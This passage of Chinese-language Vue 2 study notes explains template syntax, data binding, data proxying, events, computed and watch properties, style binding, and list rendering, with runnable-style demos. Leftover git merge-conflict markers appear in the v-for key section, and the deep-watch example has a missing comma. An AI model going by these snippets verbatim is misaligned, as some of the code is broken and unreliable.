# Vue核心

> vscode插件：
>
> Vue 3 Snippets 有拓写



## vue 是什么

是一套用于**构建用户界面**的**渐进式**JS框架

> 渐进式：Vue可以自底向上逐层的应用     核心库 =》 各种Vue插件

## Vue 的特点

1. 采用**组件化**模式，提高代码复用率、且让代码更好维护

   ![image-20220626105249642](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/image-20220626105249642.png)

2. **声明式**编码编码，让编码人员无需直接操作DOM结构，提高开发效率

   ![image-20220626105403073](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/image-20220626105403073.png)

3. 使用**虚拟DOM**+优秀的**Diff算法**，尽量**复用DOM结点**

   ![image-20220626105712920](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/image-20220626105712920.png)

   ![image-20220626105756063](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/image-20220626105756063.png)

## 创建 Vue 实例

```vue
<!-- 容器 （vue模板） -->
<div id="root">
    <!-- 容器 （vue模板） -->
    <h1>
        Hello, {{name}}
    </h1>
</div>
<script>
    //配置 阻止vue在启动时生成生产提示
    Vue.config.productionTip = false
    // 创建Vue实例 方法1：
const vm = new Vue({
    //配置对象
    el:'#root', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串，也可以el: document.getElementById('root'), 
    //data中用于存储数据，数据供el所指定的容器去使用，值可以写作一个对象 方法1 对象式：
	data:{ 
		name:'张三'
	}
    //方法2 函数式：
    data() {
    return {
        name: "张三",
    }
}
});
    
    // 创建Vue实例 方法2：
const vm = new Vue({
	data:{ 
		name:'张三'
	}
});
    vm.$mount('#root');
</script>
```

> 容器和实例之间的关系是**一对一**的
>
> 插值语句：{{ js表达式 }}
>
> 注意区分 js表达式 和 js代码（语句）
>
> 1、表达式：一个表达式会**产生一个值**，可以放在任何一个需要值的地方
>
> （1）a
>
> （2）a + b
>
> （3）demo(1)
>
> （4）x === y ?  'a' : 'b'
>
> 2、js代码（语句）
>
> （1） if(){}
>
> （2） for(){}
>
> **data与el的两种写法**
>
> 1. el
>
>    1.  new Vue 时候配置el属性。
>    2. 先创建Vue实例，随后将再通过 vm.$mount('#root')指定el的值。
>
> 2. data
>
>    1. 对象式
>
>    2. 函数式
>
>       如何选择：学习组件时，data必须使用函数式，否则会报错
>
>    3. 重要原则：由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了

## Vue 模板语法

> 1. **插值语法**：
>
>    功能：用于解析标签体内容。
>
>    写法：{{ }}，xxx是js表达式，且可以直接读取到data 中的所有属性。
>
> 2. **指令语法**：
>
>    功能：用于解析标签（包括：标签属性、标签体内容、绑定事件等）。
>
>    举例：v-bind:href="xxx" 或者 :href="xxx" xxx同样是js表达式，且可以直接读取到data 中的所有属性。

<div id="root">
    <a v-bind:href="url">
       百度一下
    </a>
    <a :href="url2">
       谷歌一下
    </a>
</div>
<script>
    Vue.config.productionTip = false
const vm = new Vue({
    el:'#root',
	data:{ 
		url:'www.baidu.com',
        url2:'www.chrome.com'
	}
}); 
</script>
## Vue 数据绑定

<div id="root">
    单向数据绑定： <input type="text" v-bind:value = "name">
    双向数据绑定： <input type="text" v-model:value = "name">
</div>
<script>
    Vue.config.productionTip = false
const vm = new Vue({
    el:'#root',
	data:{ 
		name: "123",
	}
}); 
</script>

> 1. **单向数据绑定**：
>
>    普通写法：<input type="text" v-bind:value = "name">
>
>    简写：<input type="text" :value = "name">
>
>    功能：数据只能从data流向页面
>
> 2. **双向数据绑定**：
>
>    普通写法：<input type="text" v-model:value = "name">
>
>    简写：<input type="text" v-model = "name">
>
>    功能：数据不仅能从data流向页面，还可以从页面流向data
>    
>    备注：1. 双向绑定一般都应用在表单类元素上（如：input、select等）
>    
>    ​           2. v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。

## Vue 中的 MVVM模型

1. M：Model（模型）：对应data中的数据
2. V：View（视图）：模板
3. VM：ViewModel（视图模型）：Vue实例对象

![image-20220626172244415](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/image-20220626172244415.png)

对应代码：

![image-20220626172537645](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/image-20220626172537645.png)

> 注意：
>
> 1. data中所有的属性，都加到了vm上
> 2. vm上所有的属性 以及 Vue 原型上所有的属性，在Vue模板中都可以直接使用

## 数据代理

### Object.defineproperty

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>回顾Object.defineproperty方法</title>
	</head>
	<body>
		<script type="text/javascript" >
			let number = 18
			let person = {
				name:'张三',
				sex:'男',
			}

			Object.defineProperty(person,'age',{
				// value:18,
				// enumerable:true, //控制属性是否可以枚举，默认值是false
				// writable:true, //控制属性是否可以被修改，默认值是false
				// configurable:true //控制属性是否可以被删除，默认值是false

				//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
				get(){
					console.log('有人读取age属性了')
					return number
				},

				//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
				set(value){
					console.log('有人修改了age属性，且值是',value)
					number = value
				}

			})
			// console.log(Object.keys(person))
			console.log(person)
		</script>
	</body>
</html>
```

### 何为数据代理

> 通过一个对象 代理 对另一个对象中属性的操作（读/写）

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>何为数据代理</title>
	</head>
	<body>
		<script type="text/javascript" >
			let obj = {x:100};
            let obj2 = {y:100};

			Object.defineProperty(obj2,'x',{
                get() {
                    return obj.x
                },
                set(value) {
                    obj.x = value
                }
            })
		</script>
	</body>
</html>
```

### Vue中的数据代理

> 1.Vue中的数据代理：
>
> ​    通过vm对象来代理data对象中属性的操作（读/写）
>
> 2.Vue中数据代理的好处：
>
>    更加方便的操作data中的数据
>
> 3.基本原理：
>
> ​     通过Object.defineProperty()把data对象中所有属性添加到vm上。
>
> ​      为每一个添加到vm上的属性，都指定一个getter/setter。
>
> ​      在getter/setter内部去操作（读/写）data中对应的属性。

![image-20220627113420924](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/image-20220627113420924.png)

### vue监测数据改变

> Vue监视数据的原理：
>    				1. vue会监视data中**所有层次**的数据。
>
>   2. 如何监测对象中的数据？
> 	
>      通过**setter**实现监视，且要在new Vue时就传入要监测的数据。
>      (1).对象中后追加的属性，Vue默认不做响应式处理
>      (2).如需给后添加的属性做响应式，请使用如下API：
>      	**Vue.set**(target，propertyName/index，value) 或 
>      	**vm.$set**(target，propertyName/index，value)
> 	
> 		2. 如何监测数组中的数据？
> 通过**包裹数组**更新元素的方法实现，本质就是做了两件事：
> (1).调用原生对应的方法对数组进行更新。
> (2).重新解析模板，进而更新页面。
> 	
> 		2. 在**Vue修改数组**中的某个元素一定要用如下方法：
> 1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
> 2.Vue.set() 或 vm.$set()
> 	
>    5.  Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>总结数据监视</title>
		<style>
			button{
				margin-top: 10px;
			}
		</style>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学生信息</h1>
			<button @click="student.age++">年龄+1岁</button> <br/>
			<button @click="addSex">添加性别属性，默认值：男</button> <br/>
			<button @click="student.sex = '未知' ">修改性别</button> <br/>
			<button @click="addFriend">在列表首位添加一个朋友</button> <br/>
			<button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
			<button @click="addHobby">添加一个爱好</button> <br/>
			<button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
			<button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
			<h3>姓名：{{student.name}}</h3>
			<h3>年龄：{{student.age}}</h3>
			<h3 v-if="student.sex">性别：{{student.sex}}</h3>
			<h3>爱好：</h3>
			<ul>
				<li v-for="(h,index) in student.hobby" :key="index">
					{{h}}
				</li>
			</ul>
			<h3>朋友们：</h3>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				student:{
					name:'tom',
					age:18,
					hobby:['抽烟','喝酒','烫头'],
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				},
				addFriend(){
					this.student.friends.unshift({name:'jack',age:70})
				},
				updateFirstFriendName(){
					this.student.friends[0].name = '张三'
				},
				addHobby(){
					this.student.hobby.push('学习')
				},
				updateHobby(){
					// this.student.hobby.splice(0,1,'开车')
					// Vue.set(this.student.hobby,0,'开车')
					this.$set(this.student.hobby,0,'开车')
				},
				removeSmoke(){
					this.student.hobby = this.student.hobby.filter((h)=>{
						return h !== '抽烟'
					})
				}
			}
		})
	</script>
</html>
```

##  事件处理

> 事件的基本使用：
>
> ​              1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
>
> ​              2.事件的回调需要配置在methods对象中，最终会在vm上；
>
> ​              3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
>
> ​              4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
>
> ​              5.@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件的基本使用</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- <button v-on:click="showInfo">点我提示信息</button> -->
			<button @click="showInfo1">点我提示信息1（不传参）</button>
			<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
			},
			methods:{
				showInfo1(event){
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！')
				},
				showInfo2(event,number){
					console.log(event,number)
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！！')
				}
			}
		})
	</script>
</html>
```

## 事件修饰符

> Vue中的事件修饰符：
> 						1.prevent：阻止默认事件（常用）；
> 						2.stop：阻止事件冒泡（常用）；
> 						3.once：事件只触发一次（常用）；
> 						4.capture：使用事件的捕获模式；
> 						5.self：只有event.target是当前操作的元素时才触发事件；
> 						6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件修饰符</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
		<style>
			*{
				margin-top: 20px;
			}
			.demo1{
				height: 50px;
				background-color: skyblue;
			}
			.box1{
				padding: 5px;
				background-color: skyblue;
			}
			.box2{
				padding: 5px;
				background-color: orange;
			}
			.list{
				width: 200px;
				height: 200px;
				background-color: peru;
				overflow: auto;
			}
			li{
				height: 100px;
			}
		</style>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- 阻止默认事件（常用） -->
			<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>

			<!-- 阻止事件冒泡（常用） -->
			<div class="demo1" @click="showInfo">
				<button @click.stop="showInfo">点我提示信息</button>
				<!-- 修饰符可以连续写 -->
				<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
			</div>

			<!-- 事件只触发一次（常用） -->
			<button @click.once="showInfo">点我提示信息</button>

			<!-- 使用事件的捕获模式 -->
			<div class="box1" @click.capture="showMsg(1)">
				div1
				<div class="box2" @click="showMsg(2)">
					div2
				</div>
			</div>

			<!-- 只有event.target是当前操作的元素时才触发事件； -->
			<div class="demo1" @click.self="showInfo">
				<button @click="showInfo">点我提示信息</button>
			</div>

			<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
			<ul @wheel.passive="demo" class="list">
				<li>1</li>
				<li>2</li>
				<li>3</li>
				<li>4</li>
			</ul>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods:{
				showInfo(e){
					alert('同学你好！')
					// console.log(e.target)
				},
				showMsg(msg){
					console.log(msg)
				},
				demo(){
					for (let i = 0; i < 100000; i++) {
						console.log('#')
					}
					console.log('累坏了')
				}
			}
		})
	</script>
</html>
```

## 键盘事件

> 1.Vue中常用的按键别名：
> 							回车 => enter
> 							删除 => delete (捕获“删除”和“退格”键)
> 							退出 => esc
> 							空格 => space
> 							换行 => tab (特殊，必须配合keydown去使用)
> 							上 => up
> 							下 => down
> 							左 => left
> 							右 => right
>
> 2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
>
> 3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
> 	(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
> 	(2).配合keydown使用：正常触发事件。
>
> 4.也可以使用keyCode去指定具体的按键（不推荐）
>
> 5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
>
> 6.也可以绑定组合按键，比如@keydown.ctrl.y

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>键盘事件</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods: {
				showInfo(e){
					// console.log(e.key,e.keyCode)
					console.log(e.target.value)
				}
			},
		})
	</script>
</html>
```

## 计算属性

>   计算属性：
> 					1.定义：要用的属性不存在，要通过已有属性计算得来。
> 					2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
> 					3.get函数什么时候执行？
> 								(1).初次读取时会执行一次。
> 								(2).当依赖的数据发生改变时会被再次调用。
> 					4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
> 					5.备注：
> 							1.计算属性最终会出现在vm上，直接读取使用即可。
> 							2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_计算属性实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			测试：<input type="text" v-model="x"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
			<!-- 全名：<span>{{fullName}}</span> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
			全名：<span>{{fullName}}</span> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
				x:'你好'
			},
			methods: {
				demo(){
					
				}
			},
			computed:{
				fullName:{
					//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
					//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
					get(){
						console.log('get被调用了')
						// console.log(this) //此处的this是vm
						return this.firstName + '-' + this.lastName
					},
					//set什么时候调用? 当fullName被修改时。
					set(value){
						console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
					}
				}
			}
		})
	</script>
</html>
```

计算属性的简写情况 （属性只读不改时）：

```vue
computed: {
                fullName(){
                 	return this.firstName + '-' + this.lastName
                }
}
```

## 侦听属性

> 监视属性watch：
> 					1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
> 					2.监视的属性必须存在，才能进行监视！！
> 					3.监视的两种写法：
> 							(1).new Vue时传入watch配置
> 							(2).通过vm.$watch监视

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_监视属性</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
	
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			/* watch:{
				isHot:{
					immediate:true, //初始化时让handler调用一下
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}
			} */
		})

		vm.$watch('isHot',{
			immediate:true, //初始化时让handler调用一下
			//handler什么时候调用？当isHot发生改变时。
			handler(newValue,oldValue){
				console.log('isHot被修改了',newValue,oldValue)
			}
		})
	</script>
</html>
```

**简写形式：**

```vue
isHot(newValue,oldValue){
	console.log('isHot被修改了',newValue,oldValue)
}

vm.$watch('isHot',function(newValue,oldValue){
	console.log('isHot被修改了',newValue,oldValue)
})
```



### 深度监视

> 深度监视：
> 						(1).Vue中的watch默认不监测对象内部值的改变（一层）。
> 						(2).配置deep:true可以监测对象内部值改变（多层）。
> 				备注：
> 						(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
> 						(2).使用watch时根据数据的具体结构，决定是否采用深度监视。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_深度监视</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h3>a的值是:{{numbers.a}}</h3>
			<button @click="numbers.a++">点我让a+1</button>
			<h3>b的值是:{{numbers.b}}</h3>
			<button @click="numbers.b++">点我让b+1</button>
			<button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
			{{numbers.c.d.e}}
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				numbers:{
					a:1,
					b:1,
					c:{
						d:{
							e:100
						}
					}
				}
			}
			watch:{
				//监视多级结构中某个属性的变化
				/* 'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				} */
				//监视多级结构中所有属性的变化
				numbers:{
					deep:true,
					handler(){
						console.log('numbers改变了')
					}
				}
			}
		})

	</script>
</html>
```

**计算属性 VS 侦听属性**

>  侦听属性比计算属性更适用于**异步**的情况
>
> computed和watch之间的区别：
>
> ​            1.computed能完成的功能，watch都可以完成。
>
> ​            2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。
>
> ​        两个重要的小原则：
>
> ​              1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
>
> ​              2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，
>
> ​                这样this的指向才是vm 或 组件实例对象。

## 绑定样式

### 通过class绑定

> 写法:class="xxx" xxx可以是字符串、对象、数组。
> **字符串写法** 适用于：类名不确定，要动态获取。
> **数组写法 **适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>绑定样式</title>
		<style>
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
			
			.happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
			}
			.sad{
				border: 4px dashed rgb(2, 197, 2);
				background-color: gray;
			}
			.normal{
				background-color: skyblue;
			}

			.atguigu1{
				background-color: yellowgreen;
			}
			.atguigu2{
				font-size: 30px;
				text-shadow:2px 2px 10px red;
			}
			.atguigu3{
				border-radius: 20px;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
			<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
			<div class="basic" :class="classArr">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
			<div class="basic" :class="classObj">{{name}}</div> <br/><br/>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				mood:'normal',
				classArr:['atguigu1','atguigu2','atguigu3'],
				classObj:{
					atguigu1:false,
					atguigu2:false,
				}
			},
			methods: {
				changeMood(){
					const arr = ['happy','sad','normal']
					const index = Math.floor(Math.random()*3)
					this.mood = arr[index]
				}
			},
		})
	</script>
	
</html>
```

### 通过style绑定

> style="{fontSize: xxx}"  其中xxx是动态值。
> style="[a,b]"  其中a、b是样式对象。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>绑定样式</title>
		<style>
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 绑定style样式--对象写法 -->
			<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
			<!-- 绑定style样式--数组写法 -->
			<div class="basic" :style="styleArr">{{name}}</div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				styleObj:{
					fontSize: '40px',
					color:'red',
				},
				styleObj2:{
					backgroundColor:'orange'
				},
				styleArr:[
					{
						fontSize: '40px',
						color:'blue',
					},
					{
						backgroundColor:'gray'
					}
				]
			}
		})
	</script>
	
</html>	
```

## 条件渲染

> v-if  V S v-show
>
> 1.v-if
> 		写法：
> 			(1).v-if="表达式" 
> 			(2).v-else-if="表达式"
> 			(3).v-else="表达式"
> 		适用于：**切换频率较低**的场景。
> 		特点：不展示的DOM元素**直接被移除**。
> 		注意：v-if可以和:v-else-if、v-else一起使用，但要求**结构不能被“打断”**。
>
> 2.v-show
> 	写法：v-show="表达式"
> 	适用于：**切换频率较高**的场景。
> 	特点：不展示的DOM元素**未被移**除，仅仅是使用样式隐藏掉
> 			
> 3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>条件渲染</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
			<!-- 使用v-show做条件渲染 -->
			<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- 使用v-if做条件渲染 -->
			<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- v-else和v-else-if -->
			<!-- <div v-if="n === 1">Angular</div>
			<div v-else-if="n === 2">React</div>
			<div v-else-if="n === 3">Vue</div>
			<div v-else>哈哈</div> -->

			<!-- v-if与template的配合使用 -->
			<template v-if="n === 1">
				<h2>你好</h2>
				<h2>尚硅谷</h2>
				<h2>北京</h2>
			</template>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:0
			}
		})
	</script>
</html>
```

## 列表渲染

### 基本列表v-for

> 1.用于展示列表数据
>
> 2.语法：v-for="(item, index) in xxx" :key="yyy"
>
> 3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本列表</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<ul>
				<li v-for="(p,index) of persons" :key="index">
					{{p.name}}-{{p.age}}
				</li>
			</ul>

			<!-- 遍历对象 -->
			<h2>汽车信息（遍历对象）</h2>
			<ul>
				<li v-for="(value,k) of car" :key="k">
					{{k}}-{{value}}
				</li>
			</ul>

			<!-- 遍历字符串 -->
			<h2>测试遍历字符串（用得少）</h2>
			<ul>
				<li v-for="(char,index) of str" :key="index">
					{{char}}-{{index}}
				</li>
			</ul>
			
			<!-- 遍历指定次数 -->
			<h2>测试遍历指定次数（用得少）</h2>
			<ul>
				<li v-for="(number,index) of 5" :key="index">
					{{index}}-{{number}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					],
					car:{
						name:'奥迪A8',
						price:'70万',
						color:'黑色'
					},
					str:'hello'
				}
			})
		</script>
</html>
```

### v-for中的key

- 当将数组的下标**index** 作为key时

![image-20220629190916608](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/image-20220629190916608.png)

- 当将数组每一项的**唯一标识**作为key时

![image-20220629191144487](https://raw.githubusercontent.com/Thea-wyj/pic/main/img/image-20220629191144487.png)

- 当**不写key**时， vue会自动将index作为key

> react、vue中的key有什么作用？（key的内部原理）
>
> 				1. **虚拟DOM中key的作用**：
> key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
> 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
>								1. 对比规则：
> 
> 						(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
> 		①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
> 		②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
> 																					
> 						(2).旧虚拟DOM中未找到与新虚拟DOM相同的key创建新的真实DOM，随后渲染到到页面。
> 																					
> 						用index作为key可能会引发的问题：
> 																					
> 						1. 若对数据进行：逆序添加、逆序删除等**破坏顺序操作**: 会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
> 																					
> 						           2. 如果结构中还包含**输入类的DOM**：会产生错误DOM更新 ==> 界面有问题。
> 																					
=======
=======
>>>>>>> edf05547f15727f3313afc6a56393c4bbf468ac8
=======
>>>>>>> edf05547f15727f3313afc6a56393c4bbf468ac8
> 																			
> 						(2).旧虚拟DOM中未找到与新虚拟DOM相同的key创建新的真实DOM，随后渲染到到页面。
> 																			
> 						用index作为key可能会引发的问题：
> 																			
> 						1. 若对数据进行：逆序添加、逆序删除等**破坏顺序操作**: 会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
> 																			
> 						           2. 如果结构中还包含**输入类的DOM**：会产生错误DOM更新 ==> 界面有问题。
> 																			
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> edf05547f15727f3313afc6a56393c4bbf468ac8
=======
>>>>>>> edf05547f15727f3313afc6a56393c4bbf468ac8
=======
>>>>>>> edf05547f15727f3313afc6a56393c4bbf468ac8
> 						**开发中如何选择key**?:
> 1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
> 2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>key的原理</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
	
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<button @click.once="add">添加一个老刘</button>
			<ul>
				<li v-for="(p,index) of persons" :key="index">
					{{p.name}}-{{p.age}}
					<input type="text">
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
						{id:'003',name:'王五',age:20}
					]
				},
				methods: {
					add(){
						const p = {id:'004',name:'老刘',age:40}
						this.persons.unshift(p)
					}
				},
			})
		</script>
</html>
```

## 收集表单数据

> 收集表单数据：
> 	若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
> 	若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
> 	若：<input type="checkbox"/>
> 		1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
> 		2.配置input的value属性:
> 			(1)v-model的初始值是**非数组**，那么收集的就是**checked**（勾选 or 未勾选，是布尔值）
